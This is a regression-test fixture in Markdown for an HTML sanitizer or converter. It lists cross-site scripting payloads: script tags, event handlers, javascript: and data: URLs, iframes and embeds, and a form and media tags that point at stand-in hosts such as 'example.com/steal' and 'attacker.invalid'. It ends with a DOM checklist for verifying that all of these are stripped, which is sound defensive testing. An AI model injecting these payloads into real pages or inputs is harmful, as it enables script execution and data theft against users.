# Unsafe HTML Regression Test

This document enumerates malicious HTML constructs. After conversion, none of these payloads should execute JavaScript, spawn network requests, or keep interactive navigation targets. Links should be inert, resources blocked unless explicitly whitelisted.

## Inline script

<script>alert('inline script executed');</script>

## External script

<script src="https://example.com/exfil.js"></script>

## Event handlers

<div onclick="alert('clicked!')">click me</div>
<a href="#" onmouseover="alert('hover!')">hover link</a>

## javascript: URL

<a href="javascript:alert('boom')">javascript link</a>

## data: javascript

<a href="data:text/javascript,alert('js data')">data js link</a>

## SVG script

<svg>
  <script>alert('svg script');</script>
</svg>

## Iframe and embed

<iframe src="https://example.com"></iframe>
<object data="https://example.com/payload"></object>
<embed src="https://example.com/payload"></embed>

## Form submission

<form action="https://example.com/steal" method="post">
  <input name="secret" value="should not submit" />
  <button type="submit">Submit</button>
</form>

## Image with javascript protocol

<img src="javascript:alert('img js')" alt="img" />

## Image with data URI (non-image MIME)

<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGQnKTwvc2NyaXB0Pg==" alt="unexpected" />

## Srcset with javascript

<img srcset="javascript:alert('set') 1x, https://safe.example/image.png 2x" src="https://safe.example/default.png" alt="srcset" />

## XLink href

<svg>
  <a xlink:href="https://example.com/should-be-anchor">link</a>
  <a xlink:href="javascript:alert('xlink')">bad link</a>
</svg>

## Audio/video sources

<audio src="https://attacker.invalid/steal.mp3" controls></audio>
<video src="javascript:alert('video')" controls></video>

---

After rendering, inspect the DOM to confirm that:

- No `<script>`, `<iframe>`, `<object>`, or `<embed>` nodes remain.
- All event handler attributes (`on*`) are removed.
- `href`, `xlink:href`, `action`, `formaction`, etc., either vanish or reduce to `#` when interactive behavior is not desired.
- `srcset` entries with unsafe URLs disappear entirely.
- Only safe image/data URLs remain.
